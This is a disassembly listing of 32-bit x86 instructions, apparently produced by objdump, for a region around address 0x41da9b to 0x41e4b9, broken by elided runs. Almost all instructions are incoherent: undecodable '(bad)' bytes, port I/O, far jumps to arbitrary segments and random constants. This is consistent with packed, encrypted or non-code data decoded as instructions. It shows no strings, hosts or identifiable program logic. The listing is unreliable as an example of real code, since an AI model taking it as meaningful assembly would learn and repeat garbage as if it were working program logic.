  41da9b:	in     al,0x3
  41da9d:	pop    eax
  41da9e:	fidiv  DWORD PTR [edx]
  41daa0:	and    DWORD PTR [edx+0x37],0x454ffd60
  41daa7:	sub    al,0x7c
  41daa9:	mov    ss,WORD PTR [esi]
  41daab:	jge    0x41db14
  41daad:	xchg   esi,eax
  41daae:	sub    ebx,ebp
  41dab0:	xor    dl,bl
  41dab2:	and    DWORD PTR [ebx],esp
  41dab4:	add    ebp,DWORD PTR [ebx+0x25ef633a]
  41daba:	pop    esi
  41dabb:	dec    esi
  41dabc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dabd:	pop    edx
  41dabe:	cld    
  41dabf:	rcr    BYTE PTR ds:0xecf1a4db,cl
  41dac5:	push   es
  41dac6:	cld    
  41dac7:	xor    BYTE PTR [esi-0x632771b2],bl
  41dacd:	push   eax
  41dace:	(bad)  
  41dacf:	loope  0x41da7b
  41dad1:	and    BYTE PTR [ebx-0x70],cl
  41dad4:	dec    ebx
  41dad5:	gs push edi
  41dad7:	xchg   DWORD PTR [ebx],esp
  41dad9:	out    dx,al
  41dada:	(bad)
  41dadd:	pop    eax
  41dade:	outs   dx,DWORD PTR ds:[esi]
  41dadf:	ror    BYTE PTR [ebx+0x456e3a58],0xd4
  41dae6:	xor    BYTE PTR [ebx],0x3
  41dae9:	jb     0x41da9a
  41daeb:	mov    al,ds:0x4d
	...
  41db54:	add    BYTE PTR [eax],al
  41db56:	sbb    al,0x15
  41db58:	jnp    0x41dbad
  41db5a:	jnp    0x41dbdb
  41db5c:	cmp    al,0x5f
  41db5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db5f:	push   edi
  41db60:	sbb    ebp,0xfffffffd
  41db63:	or     bh,cl
  41db65:	mov    bh,0xff
  41db67:	add    DWORD PTR ds:[eax],eax
  41db6a:	inc    DWORD PTR [eax]
  41db6c:	add    BYTE PTR [eax],al
  41db6e:	not    DWORD PTR [ebx]
  41db70:	aaa    
  41db71:	(bad)
  41db74:	pusha  
  41db75:	push   ss
  41db76:	lock cs cmp ecx,ebp
  41db7a:	into   
  41db7b:	mov    al,0x50
  41db7d:	jnp    0x41dbfe
  41db7f:	mov    dl,dh
  41db81:	outs   dx,BYTE PTR ds:[esi]
  41db82:	cmp    bl,0xe1
  41db85:	sbb    BYTE PTR [edx-0x79],bh
  41db88:	xor    dl,BYTE PTR [edi]
  41db8a:	mov    ds:0x67306953,al
  41db8f:	test   DWORD PTR [esi-0x26b73c96],ecx
  41db95:	arpl   WORD PTR ds:0xd2b70b5d,ax
  41db9b:	push   esp
  41db9c:	and    al,0xab
  41db9e:	pop    ds
  41db9f:	sbb    BYTE PTR [edi+0x2b59399f],dh
  41dba5:	and    esi,DWORD PTR [esi-0x21]
  41dba8:	call   0xe005:0x7469b611
  41dbaf:	pop    esi
  41dbb0:	sub    esp,edx
  41dbb2:	xchg   ebp,eax
  41dbb3:	push   ds
  41dbb4:	push   ss
  41dbb5:	jge    0x41db84
  41dbb7:	xchg   esp,eax
  41dbb8:	sub    BYTE PTR [ebp-0x23],0xeb
  41dbbc:	jb     0x41dbca
  41dbbe:	ss add al,0xea
  41dbc1:	out    dx,al
  41dbc2:	dec    edx
  41dbc3:	push   ss
  41dbc4:	fdivr  QWORD PTR [ecx-0x2ede4842]
  41dbca:	cmp    DWORD PTR [ecx],edi
  41dbcc:	es iret 
  41dbce:	mov    ds,WORD PTR [edi]
  41dbd0:	popa   
  41dbd1:	xor    al,0x85
  41dbd3:	ss jle 0x41dc13
  41dbd6:	inc    edi
  41dbd7:	sub    ch,BYTE PTR [edx+0x38]
  41dbda:	push   edx
  41dbdb:	cmp    DWORD PTR [ecx+edx*8-0x64],ebp
  41dbdf:	pop    ebp
  41dbe0:	stc    
  41dbe1:	inc    ebx
  41dbe2:	(bad)  
  41dbe3:	pop    ds
  41dbe4:	les    ebx,FWORD PTR [edi-0x9231ff0]
  41dbea:	shl    BYTE PTR [eax+0x64],1
  41dbed:	cli    
  41dbee:	fs sub eax,0x8c3f54f7
  41dbf4:	add    BYTE PTR [ebp+0x432ac6b1],dl
  41dbfa:	test   BYTE PTR [eax-0x40],0xa4
  41dbfe:	push   edx
  41dbff:	sbb    ah,0xa6
  41dc02:	xchg   edi,eax
  41dc03:	leave  
  41dc04:	adc    eax,0xc57e31d4
  41dc09:	xor    al,0xa9
  41dc0b:	fimul  DWORD PTR [ebx-0x21fd7d51]
  41dc11:	imul   edx,DWORD PTR [edx+0x33958e23],0x56
  41dc18:	xor    eax,0x4a31f112
  41dc1d:	sbb    DWORD PTR [esi+0x28],ecx
  41dc20:	or     eax,0x35ab8272
  41dc25:	push   ds
  41dc26:	data16 sub ax,0xd0d4
  41dc2b:	retf   
  41dc2c:	sub    eax,0x1e2f9627
  41dc31:	into   
  41dc32:	mov    dl,0x7
  41dc34:	(bad)  [ecx-0x676a35d5]
  41dc3a:	mov    BYTE PTR [edi+0x5481e0d6],0xba
  41dc41:	pop    ebx
  41dc42:	loope  0x41dbf8
  41dc44:	mov    dl,0x76
  41dc46:	retf   0x8167
  41dc49:	loop   0x41dbf5
  41dc4b:	enter  0x1095,0x80
  41dc4f:	ds adc eax,0x5e4f736c
  41dc55:	(bad)  
  41dc56:	in     eax,dx
  41dc57:	gs inc edx
  41dc59:	shr    ah,cl
  41dc5b:	or     DWORD PTR ds:0xdce95bb9,edi
  41dc61:	mov    ecx,0x498e087f
  41dc66:	in     al,dx
  41dc67:	jg     0x41dcc8
  41dc69:	lock or eax,0x1194
	...
  41dcd3:	add    BYTE PTR [eax],al
  41dcd5:	add    BYTE PTR [edi-0x36],ch
  41dcd8:	adc    eax,0xefdfb598
  41dcdd:	jmp    DWORD PTR [edi-0x564f2fb0]
  41dce3:	ret    0xd7c9
  41dce6:	(bad)  
  41dce7:	aas    
  41dce8:	add    DWORD PTR [eax],eax
  41dcea:	inc    DWORD PTR [eax]
  41dcec:	add    BYTE PTR [eax],al
  41dcee:	outs   dx,DWORD PTR ds:[esi]
  41dcef:	pop    ds
  41dcf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcf1:	mov    edx,0x59a3557f
  41dcf6:	call   0x8031d3a8
  41dcfb:	shl    BYTE PTR [ebx],cl
  41dcfd:	not    ebp
  41dcff:	push   0x5526d09b
  41dd04:	mov    dh,0xa5
  41dd06:	inc    ecx
  41dd07:	fmul   DWORD PTR [eax-0x43273bff]
  41dd0d:	fistp  WORD PTR [edi]
  41dd0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd10:	mov    al,ds:0x7faa3af3
  41dd15:	push   ebp
  41dd16:	addr16 jbe 0x41dd30
  41dd19:	enter  0xd703,0x3f
  41dd1d:	xlat   BYTE PTR ds:[ebx]
  41dd1e:	pop    esp
  41dd1f:	adc    dh,ah
  41dd21:	sbb    cl,BYTE PTR [ebx-0x19]
  41dd24:	or     eax,0x7a54031
  41dd29:	mov    esp,0xecfba6cf
  41dd2e:	je     0x41dd2b
  41dd30:	push   es
  41dd31:	les    edi,FWORD PTR [esi-0x7159cd88]
  41dd37:	imul   ebp,ecx,0xa06d34f3
  41dd3d:	add    al,0xd5
  41dd3f:	jne    0x41dcfb
  41dd41:	add    al,BYTE PTR [edx-0x4f]
  41dd44:	scas   eax,DWORD PTR es:[edi]
  41dd45:	mov    al,0x14
  41dd47:	test   BYTE PTR [ecx],dl
  41dd49:	ja     0x41dcdb
  41dd4b:	ror    BYTE PTR [esi],1
  41dd4d:	ja     0x41dd6c
  41dd4f:	ins    DWORD PTR es:[di],dx
  41dd51:	jb     0x41dd99
  41dd53:	ja     0x41dd1f
  41dd55:	stos   BYTE PTR es:[edi],al
  41dd56:	sub    DWORD PTR [esi-0x6d],ebp
  41dd59:	adc    DWORD PTR [ecx],edi
  41dd5b:	adc    DWORD PTR [edi],eax
  41dd5d:	int    0x45
  41dd5f:	daa    
  41dd60:	mov    bh,0xd1
  41dd62:	fxtract 
  41dd64:	inc    ecx
  41dd65:	sbb    eax,0x2f1ef9c
  41dd6a:	pop    esi
  41dd6b:	xchg   edi,eax
  41dd6c:	mov    ebx,0xb13fa373
  41dd71:	aam    0xa3
  41dd73:	push   cs
  41dd74:	mov    edx,DWORD PTR [ecx+0x35]
  41dd77:	jecxz  0x41ddd5
  41dd79:	iret   
  41dd7a:	mov    eax,0x4e8dc227
  41dd7f:	sar    dh,cl
  41dd81:	mov    edx,0xcda9d748
  41dd86:	rol    BYTE PTR [edx+0x133369bc],0x4b
  41dd8d:	lods   al,BYTE PTR ds:[esi]
  41dd8e:	lahf   
  41dd8f:	scas   eax,DWORD PTR es:[edi]
  41dd90:	mov    esi,0x9a5224b9
  41dd95:	ja     0x41dd91
  41dd97:	sar    BYTE PTR gs:[ecx+0x53ecbf72],cl
  41dd9e:	sbb    BYTE PTR [ecx],al
  41dda0:	(bad)  
  41dda1:	mov    dl,0x78
  41dda3:	out    dx,eax
  41dda4:	pop    esp
  41dda5:	leave  
  41dda6:	inc    edi
  41dda7:	mov    ds:0x3a4ec688,eax
  41ddac:	lods   al,BYTE PTR ds:[esi]
  41ddad:	lock dec ebx
  41ddaf:	fsub   st,st(5)
  41ddb1:	imul   esp,ebp,0x4b
  41ddb4:	outs   dx,DWORD PTR ds:[esi]
  41ddb5:	sbb    ch,BYTE PTR [ebp+0x401a684b]
  41ddbb:	jl     0x41ddc2
  41ddbd:	shl    DWORD PTR ds:0xcc93796d,0x6a
  41ddc4:	adc    edi,DWORD PTR [ebx]
  41ddc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddc7:	ss or  ebp,ecx
  41ddca:	add    DWORD PTR fs:0x7728b556,ebp
  41ddd1:	pop    ebp
  41ddd2:	cs leave 
  41ddd4:	inc    ecx
  41ddd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddd6:	adc    al,0x6e
  41ddd8:	and    BYTE PTR [ebx+0x7621fd2d],cl
  41ddde:	push   ebp
  41dddf:	ja     0x41dd83
  41dde1:	js     0x41ddb5
  41dde3:	scas   al,BYTE PTR es:[edi]
  41dde4:	xor    DWORD PTR [esi+edx*4+0x23d152b0],ebp
  41ddeb:	enter  0x6f,0x0
	...
  41de53:	add    BYTE PTR [eax],al
  41de55:	add    BYTE PTR [eax],ah
  41de57:	repz das 
  41de59:	cmp    bh,0xde
  41de5c:	lods   eax,DWORD PTR ds:[esi]
  41de5d:	repz pop ds
  41de5f:	mov    bl,BYTE PTR [esi-0x41]
  41de62:	fsubr  QWORD PTR ds:0x40fdaea7
  41de68:	add    DWORD PTR [eax],eax
  41de6a:	inc    DWORD PTR [eax]
  41de6c:	add    BYTE PTR [eax],al
  41de6e:	xlat   BYTE PTR ds:[ebx]
  41de6f:	das    
  41de70:	int    0x3a
  41de72:	cmp    DWORD PTR [edi-0x45921bee],ecx
  41de78:	cld    
  41de79:	(bad)  
  41de7a:	cwde   
  41de7b:	lods   al,BYTE PTR ds:[esi]
  41de7c:	mov    dl,0x19
  41de7e:	cld    
  41de7f:	mov    ecx,0x3919039b
  41de84:	lods   eax,DWORD PTR ds:[esi]
  41de85:	ss push esp
  41de87:	test   DWORD PTR [ecx+eax*2],0x34d5cd9f
  41de8e:	dec    ebp
  41de8f:	cmp    al,BYTE PTR [esp+edi*1+0x45]
  41de93:	dec    ebx
  41de94:	arpl   WORD PTR [ecx+0x58],di
  41de97:	in     eax,dx
  41de98:	retf   0x8d5c
  41de9b:	popa   
  41de9c:	fld    TBYTE PTR [edx+0x5]
  41de9f:	pushf  
  41dea0:	inc    ecx
  41dea1:	cmp    cl,al
  41dea3:	xchg   BYTE PTR [edx+0x6deb0b93],bh
  41dea9:	xchg   ebx,eax
  41deaa:	xor    ebx,ecx
  41deac:	add    DWORD PTR [ecx],0xffffffb5
  41deaf:	stos   DWORD PTR es:[edi],eax
  41deb0:	cmp    ch,al
  41deb2:	mov    ebx,0xd4949ab9
  41deb7:	push   ebp
  41deb8:	ss (bad) 
  41deba:	loope  0x41de55
  41debc:	and    eax,0xff945517
  41dec1:	call   0xc65466cf
  41dec6:	jecxz  0x41de61
  41dec8:	or     edx,eax
  41deca:	mov    DWORD PTR [ecx],edi
  41decc:	out    dx,eax
  41decd:	pop    ds
  41dece:	std    
  41decf:	cli    
  41ded0:	mov    WORD PTR [eax+ecx*2-0x1c4abfe7],gs
  41ded7:	out    dx,eax
  41ded8:	repz jo 0x41defe
  41dedb:	adc    BYTE PTR [ebx],0x36
  41dede:	xor    eax,0xf3adf847
  41dee3:	leave  
  41dee4:	push   cs
  41dee5:	lods   al,BYTE PTR ds:[esi]
  41dee6:	mov    ds:0x637e55ac,eax
  41deeb:	mov    al,ds:0xe53d8b2a
  41def0:	(bad)  
  41def1:	inc    esi
  41def2:	adc    ebx,edi
  41def4:	sub    BYTE PTR [eax],ah
  41def6:	enter  0xd02c,0x5a
  41defa:	shr    DWORD PTR [ecx+0xb],1
  41defd:	xor    eax,0x7b2f6ef3
  41df02:	mov    eax,ds:0xb7e9aef3
  41df07:	sub    DWORD PTR [edx-0x6b4cbfbc],edx
  41df0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df0e:	xchg   edi,eax
  41df0f:	icebp  
  41df10:	inc    esp
  41df11:	mov    ds:0x87a6d500,eax
  41df16:	fdivr  st(4),st
  41df18:	cld    
  41df19:	scas   eax,DWORD PTR es:[edi]
  41df1a:	ins    DWORD PTR es:[edi],dx
  41df1b:	idiv   cl
  41df1d:	xchg   DWORD PTR [edi+0x58],edi
  41df20:	pop    ecx
  41df21:	xchg   edx,eax
  41df22:	add    eax,0xa908959
  41df27:	rcl    ch,0x90
  41df2a:	add    BYTE PTR [ebx],bh
  41df2c:	push   ebx
  41df2d:	aaa    
  41df2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df2f:	test   eax,0x46254fde
  41df34:	jne    0x41df4b
  41df36:	mov    dl,0xf9
  41df38:	stos   BYTE PTR es:[edi],al
  41df39:	xchg   DWORD PTR [esi-0xec0f982],eax
  41df3f:	mov    ch,0xd3
  41df41:	inc    ebp
  41df42:	sar    DWORD PTR [ebx],0xba
  41df45:	mov    DWORD PTR [eax],esi
  41df47:	mov    ah,0x35
  41df49:	xchg   BYTE PTR [ebx+ecx*8],dh
  41df4c:	mov    al,ds:0xe6257e8d
  41df51:	(bad)
  41df55:	xor    al,0x6d
  41df57:	mov    esi,0x49cb4d2a
  41df5c:	sti    
  41df5d:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41df5f:	mov    ebx,0xd2afb1d2
  41df64:	or     BYTE PTR [eax+0x38f186e6],ah
  41df6a:	das    
  41df6b:	pop    ds
  41df6c:	adc    BYTE PTR [eax],al
	...
  41dfd6:	aas    
  41dfd7:	daa    
  41dfd8:	push   ss
  41dfd9:	cld    
  41dfda:	push   ds
  41dfdb:	std    
  41dfdc:	jmp    edi
  41dfde:	dec    edi
  41dfdf:	push   0x75489ce9
  41dfe4:	es pop edi
  41dfe6:	cld    
  41dfe7:	inc    ecx
  41dfe8:	add    DWORD PTR [eax],eax
  41dfea:	inc    DWORD PTR [eax]
  41dfec:	add    BYTE PTR [eax],al
  41dfee:	jb     0x41e055
  41dff0:	(bad)  
  41dff1:	sbb    al,0x6e
  41dff3:	sub    DWORD PTR [ebp-0x6f],0xfffffff8
  41dff7:	inc    eax
  41dff8:	mov    DWORD PTR [eax-0x5b],ebx
  41dffb:	call   0x147a:0x30e3975b
  41e002:	add    eax,0xc5b8114
  41e007:	push   ds
  41e008:	repnz pop es
  41e00a:	inc    ecx
  41e00b:	jg     0x41e040
  41e00d:	pusha  
  41e00e:	push   ss
  41e00f:	aad    0x72
  41e011:	jb     0x41dfa8
  41e013:	xor    edx,esi
  41e015:	cmp    edx,ecx
  41e017:	inc    edx
  41e018:	mov    ebx,0xf8967852
  41e01d:	push   es
  41e01e:	mov    bh,BYTE PTR [eax]
  41e020:	dec    ebx
  41e021:	jle    0x41e089
  41e023:	xchg   edx,eax
  41e024:	sub    eax,0x4e96836
  41e029:	arpl   WORD PTR [esp+eiz*8-0x12],si
  41e02d:	pop    es
  41e02e:	inc    edi
  41e02f:	sub    BYTE PTR [eax+0x45daf82],0x8f
  41e036:	loopne 0x41dfe8
  41e038:	cmp    esp,DWORD PTR [edx-0x19]
  41e03b:	mov    cl,0x1c
  41e03d:	mov    DWORD PTR gs:[ebx+esi*1+0x386644a2],eax
  41e045:	xchg   ebp,eax
  41e046:	pushf  
  41e047:	js     0x41e0b2
  41e049:	xchg   edi,eax
  41e04a:	(bad)  
  41e04b:	dec    ecx
  41e04c:	imul   ecx,DWORD PTR [esi],0xb2d53d82
  41e052:	xchg   ebx,eax
  41e053:	or     ch,BYTE PTR [edx-0x7e]
  41e056:	dec    esi
  41e057:	fcomp  QWORD PTR [ecx]
  41e059:	imul   eax,DWORD PTR [esi-0x2f],0x56
  41e05d:	mov    ebp,0xacd92283
  41e062:	mov    bl,0xfc
  41e064:	clc    
  41e065:	(bad)  
  41e066:	mov    dh,0xb4
  41e068:	das    
  41e069:	data16 hlt 
  41e06b:	out    0x1b,eax
  41e06d:	ror    BYTE PTR [esi-0x572c7147],1
  41e073:	mov    dh,0x2e
  41e075:	inc    esp
  41e076:	mov    ebp,0xcefecb3f
  41e07b:	fistp  QWORD PTR [edi+0x251ac210]
  41e081:	xchg   edi,eax
  41e082:	xor    DWORD PTR [ecx],edx
  41e084:	inc    edx
  41e085:	cmp    al,0x8a
  41e087:	push   esi
  41e088:	jb     0x41e07b
  41e08a:	xchg   esi,eax
  41e08b:	pop    edi
  41e08c:	inc    esp
  41e08d:	push   0x6c
  41e08f:	mov    ch,0x8f
  41e091:	mov    ds:0x14642b61,al
  41e096:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e097:	and    edi,edi
  41e099:	adc    DWORD PTR [eax-0x66d4bec7],ebp
  41e09f:	push   ds
  41e0a0:	xor    bl,BYTE PTR [ecx+0x7222d27e]
  41e0a6:	fidivr WORD PTR [ebp-0x22]
  41e0a9:	or     al,0xf
  41e0ab:	mov    ebp,0xdf5b4d9c
  41e0b0:	in     al,0xec
  41e0b2:	jb     0x41e05f
  41e0b4:	jmp    FWORD PTR cs:[eax-0x389777f9]
  41e0bb:	xchg   BYTE PTR [edi-0x29fa9f3e],dh
  41e0c1:	jns    0x41e0c5
  41e0c3:	mov    BYTE PTR [esi-0x4d],dl
  41e0c6:	and    BYTE PTR [ebp+edi*2-0x43],dh
  41e0ca:	jns    0x41e0a8
  41e0cc:	(bad)  
  41e0ce:	hlt    
  41e0cf:	jmp    0xe486:0xa0a61597
  41e0d6:	aad    0xf3
  41e0d8:	xor    al,0x22
  41e0da:	adc    BYTE PTR [ebp+0x3c6b109e],bh
  41e0e0:	sub    BYTE PTR [ebx-0x4eb04e3c],ch
  41e0e6:	pop    ebp
  41e0e7:	popf   
  41e0e8:	je     0x41e093
  41e0ea:	fld    TBYTE PTR [edi+0xb1]
	...
  41e154:	add    BYTE PTR [eax],al
  41e156:	dec    edi
  41e157:	push   ebx
  41e158:	add    al,0xc
  41e15a:	sbb    al,0x5f
  41e15c:	dec    edi
  41e15d:	push   ebx
  41e15e:	out    0x6d,eax
  41e160:	aad    0x48
  41e162:	arpl   WORD PTR [edx+0x42fbb035],sp
  41e168:	add    DWORD PTR [eax],eax
  41e16a:	inc    DWORD PTR [eax]
  41e16c:	add    BYTE PTR [eax],al
  41e16e:	push   ebx
  41e16f:	out    0x38,al
  41e171:	pushf  
  41e172:	ins    BYTE PTR es:[edi],dx
  41e173:	(bad)  
  41e174:	int    0x8f
  41e176:	retf   0x738a
  41e179:	push   edi
  41e17a:	(bad)  
  41e17c:	mov    esp,0x2bbb13fa
  41e181:	hlt    
  41e182:	mov    ebp,0x5ee25d99
  41e187:	push   ecx
  41e188:	jae    0x41e1c1
  41e18a:	or     esi,DWORD PTR [edi+0x78]
  41e18d:	push   esi
  41e18e:	ficom  WORD PTR [eax]
  41e190:	test   BYTE PTR [ebx+0x27],al
  41e193:	or     BYTE PTR [ecx],dh
  41e195:	inc    ebp
  41e196:	outs   dx,BYTE PTR ds:[esi]
  41e197:	idiv   BYTE PTR ss:[edi+0x1c55ff33]
  41e19e:	dec    esi
  41e19f:	je     0x41e1df
  41e1a1:	jmp    0x41e1ac
  41e1a3:	add    al,0xca
  41e1a5:	outs   dx,DWORD PTR ds:[esi]
  41e1a6:	div    BYTE PTR ds:0xb87146ab
  41e1ac:	push   0x45
  41e1ae:	or     al,0x37
  41e1b0:	xchg   edi,eax
  41e1b1:	jne    0x41e1e3
  41e1b3:	cmp    DWORD PTR [ebp+eiz*2+0x49],eax
  41e1b7:	imul   esi,DWORD PTR [edi+0x16c659f7],0x26
  41e1be:	inc    ebp
  41e1bf:	outs   dx,BYTE PTR ds:[esi]
  41e1c0:	sub    eax,0x50c2ec
  41e1c5:	xor    BYTE PTR [ecx-0x48],bh
  41e1c8:	sti    
  41e1c9:	(bad)  
  41e1ca:	pop    ss
  41e1cb:	test   DWORD PTR [esi+0x249cea4],esi
  41e1d1:	lods   al,BYTE PTR ds:[esi]
  41e1d2:	cmp    BYTE PTR [ebx-0x7d],dl
  41e1d5:	pop    esp
  41e1d6:	dec    ebp
  41e1d7:	jae    0x41e159
  41e1d9:	pop    edi
  41e1da:	xchg   esp,ebx
  41e1dc:	xor    cl,BYTE PTR [edi-0x2831a626]
  41e1e2:	push   edi
  41e1e3:	or     ch,BYTE PTR [edi+0x5cf9dde7]
  41e1e9:	fsubr  QWORD PTR [esi-0x11b2b8a6]
  41e1ef:	xchg   ecx,eax
  41e1f0:	add    BYTE PTR [edi+0x3cc17e86],ah
  41e1f6:	test   al,0xff
  41e1f8:	jae    0x41e1ad
  41e1fa:	sbb    eax,0xc8a89b2f
  41e1ff:	mov    cl,0x4b
  41e201:	mov    ch,0x7d
  41e203:	inc    ecx
  41e204:	cmp    dh,al
  41e206:	and    DWORD PTR [edx+0x29],ebp
  41e209:	mov    edx,0xc38de9b1
  41e20e:	xlat   BYTE PTR ds:[ebx]
  41e20f:	fs cs dec esi
  41e212:	(bad)  
  41e213:	test   ebx,0x5ec79b11
  41e219:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e21a:	and    BYTE PTR [eax+eax*8+0x5f],bh
  41e21e:	push   ebp
  41e21f:	sbb    ecx,DWORD PTR [edx]
  41e221:	fistp  WORD PTR [edx-0x469763cc]
  41e227:	mov    WORD PTR [ebx],ss
  41e229:	and    BYTE PTR [ebx-0x1c],0x51
  41e22d:	pop    ebx
  41e22e:	xor    eax,DWORD PTR [eax]
  41e230:	mov    esp,0xdfcc3f94
  41e235:	sti    
  41e236:	push   es
  41e237:	arpl   WORD PTR [ebx+0x127012d7],bx
  41e23d:	(bad)  [ebx]
  41e23f:	pop    es
  41e240:	sbb    BYTE PTR [ebx-0x43],cl
  41e243:	data16 and al,0x6e
  41e246:	ss jge 0x41e259
  41e249:	dec    eax
  41e24a:	nop
  41e24b:	cmp    BYTE PTR [ecx-0x5b8e8717],bl
  41e251:	scas   al,BYTE PTR es:[edi]
  41e252:	data16 (bad) 
  41e254:	cmp    DWORD PTR [esi-0x76],edi
  41e257:	ficomp DWORD PTR [ebx]
  41e259:	(bad)  
  41e25b:	pop    edx
  41e25c:	dec    esi
  41e25d:	mov    eax,ds:0xb831ca40
  41e262:	push   edi
  41e263:	out    0xa9,al
  41e265:	ja     0x41e20a
  41e267:	(bad)  
  41e268:	arpl   WORD PTR [ebx+0x230ddb],dx
	...
  41e2d6:	stos   DWORD PTR es:[edi],eax
  41e2d7:	add    dh,BYTE PTR [edi-0x1a]
  41e2da:	push   edi
  41e2dc:	mov    ebx,0x6f64c34f
  41e2e1:	or     al,0x83
  41e2e3:	xchg   esi,eax
  41e2e4:	sub    BYTE PTR [edx+edi*8+0x43],ah
  41e2e8:	add    DWORD PTR [eax],eax
  41e2ea:	inc    DWORD PTR [eax]
  41e2ec:	add    BYTE PTR [eax],al
  41e2ee:	jecxz  0x41e36e
  41e2f0:	push   ebp
  41e2f1:	cmp    al,BYTE PTR [ebx+0x79]
  41e2f4:	ret    0xb7dc
  41e2f7:	mov    edx,DWORD PTR [edx+0xe]
  41e2fa:	in     al,dx
  41e2fb:	(bad)  
  41e2fc:	iret   
  41e2fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2fe:	mov    dl,0x56
  41e300:	inc    ecx
  41e301:	pop    ds
  41e302:	sub    DWORD PTR [esi-0x711e49c7],0x44
  41e309:	mov    ebx,0xeb98b337
  41e30e:	cld    
  41e30f:	repz ret 
  41e311:	in     al,dx
  41e312:	sub    cl,bl
  41e314:	sub    bl,cl
  41e316:	mov    esp,edi
  41e318:	outs   dx,BYTE PTR ds:[esi]
  41e319:	xchg   ebp,eax
  41e31a:	in     al,dx
  41e31b:	adc    dh,BYTE PTR [esi-0x3181222d]
  41e321:	add    BYTE PTR [esi+ebp*2-0x11],0xbb
  41e326:	xchg   DWORD PTR [edi+0x3f],ebp
  41e329:	pop    esp
  41e32a:	ins    BYTE PTR es:[edi],dx
  41e32b:	call   0xaf9c0fe4
  41e330:	mov    esp,0x7c5ec05d
  41e335:	or     BYTE PTR [esi+0x41a896b4],ch
  41e33b:	xchg   ebp,eax
  41e33c:	jnp    0x41e37f
  41e33e:	jb     0x41e2d7
  41e340:	and    ebp,eax
  41e342:	mov    cl,0x8d
  41e344:	push   ebp
  41e345:	mov    ebp,eax
  41e347:	adc    ah,ch
  41e349:	xchg   DWORD PTR [esi],ebx
  41e34b:	loopne 0x41e359
  41e34d:	sbb    ecx,DWORD PTR [esi+ebx*4+0x73681d12]
  41e354:	adc    BYTE PTR [ecx],cl
  41e356:	sar    DWORD PTR [ebx-0x1aca594f],1
  41e35c:	mov    eax,ds:0xcaadab4f
  41e361:	inc    esi
  41e362:	retf   
  41e363:	das    
  41e364:	pop    es
  41e365:	jmp    0xcf704b20
  41e36a:	(bad)  
  41e36c:	push   ds
  41e36d:	or     edi,DWORD PTR [edi+0x6f04db9a]
  41e373:	mov    ebp,ebp
  41e375:	stc    
  41e376:	std    
  41e377:	cmp    al,0x85
  41e379:	mov    al,0x2b
  41e37b:	jne    0x41e34a
  41e37d:	test   BYTE PTR [ecx-0x7faeb7d7],dh
  41e383:	push   esi
  41e384:	in     al,0x12
  41e386:	mov    bh,BYTE PTR [ecx+0x655819fc]
  41e38c:	or     BYTE PTR [ebp+0x9],0xe0
  41e390:	and    edi,DWORD PTR [ecx]
  41e392:	mov    eax,ds:0x6038b746
  41e397:	xor    BYTE PTR [ecx],0x7a
  41e39a:	sbb    al,BYTE PTR [ebx]
  41e39c:	ds push cs
  41e39e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e39f:	xor    dl,dh
  41e3a1:	in     eax,dx
  41e3a2:	or     esp,DWORD PTR [esi]
  41e3a4:	sbb    DWORD PTR [eax+0x634c645f],ebx
  41e3aa:	xor    DWORD PTR [edx-0x4edf9917],ebp
  41e3b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3b1:	push   ss
  41e3b2:	adc    bl,ah
  41e3b4:	sub    eax,0xd8840066
  41e3b9:	cmp    eax,0x88ca3ca8
  41e3be:	iret   
  41e3bf:	cmp    al,0x6
  41e3c1:	mov    cl,0xf9
  41e3c3:	mov    ecx,0x6a5477fc
  41e3c8:	nop
  41e3c9:	inc    esi
  41e3ca:	mov    ah,0x7e
  41e3cc:	push   ecx
  41e3cd:	xor    bl,BYTE PTR [esi]
  41e3cf:	fld    TBYTE PTR [ecx+0x273436d5]
  41e3d5:	stos   DWORD PTR es:[edi],eax
  41e3d6:	mov    ebx,0x72b5328c
  41e3db:	lahf   
  41e3dc:	bound  ecx,QWORD PTR [edi-0x33]
  41e3df:	cmp    ebp,ebp
  41e3e1:	mov    ds:0x66b3a846,al
  41e3e6:	hlt    
  41e3e7:	(bad)  
  41e3e8:	ror    DWORD PTR [ebp+0x61],cl
  41e3eb:	out    dx,eax
  41e3ec:	add    BYTE PTR [eax],0x0
	...
  41e453:	add    BYTE PTR [eax],al
  41e455:	add    BYTE PTR [ecx-0xe088ee],cl
  41e45b:	jg     0x41e446
  41e45d:	xchg   esi,eax
  41e45e:	or     DWORD PTR [edx+0x18],0xc2d31109
  41e465:	retf   0x44f9
  41e468:	add    DWORD PTR [eax],eax
  41e46a:	inc    DWORD PTR [eax]
  41e46c:	add    BYTE PTR [eax],al
  41e46e:	sar    BYTE PTR [ebx+0x36],1
  41e471:	jle    0x41e4bc
  41e473:	cmc    
  41e474:	in     al,dx
  41e475:	cmp    ecx,DWORD PTR [ecx-0x34a8d114]
  41e47b:	into   
  41e47c:	leave  
  41e47d:	xor    BYTE PTR [ebp-0x47],al
  41e480:	xchg   esp,eax
  41e481:	xor    BYTE PTR [esi-0x17],ah
  41e484:	jp     0x41e4c1
  41e486:	and    al,0x23
  41e488:	bnd ret 
  41e48a:	dec    edx
  41e48b:	outs   dx,DWORD PTR ds:[esi]
  41e48c:	add    eax,0xf9cb3d84
  41e491:	mov    al,ds:0xba63b476
  41e496:	in     eax,0xd
  41e498:	adc    eax,0x808d5029
  41e49d:	test   al,0x99
  41e49f:	aam    0x36
  41e4a1:	mov    edx,0xcdcc31f4
  41e4a6:	popf   
  41e4a7:	mov    al,0xd1
  41e4a9:	adc    eax,0x8f47bac
  41e4ae:	mov    bh,0xec
  41e4b0:	mov    ds:0xbaf19f7,al
  41e4b5:	adc    al,cl
  41e4b7:	(bad)  
  41e4b8:	cwde   
  41e4b9:	fcomp  st(1)
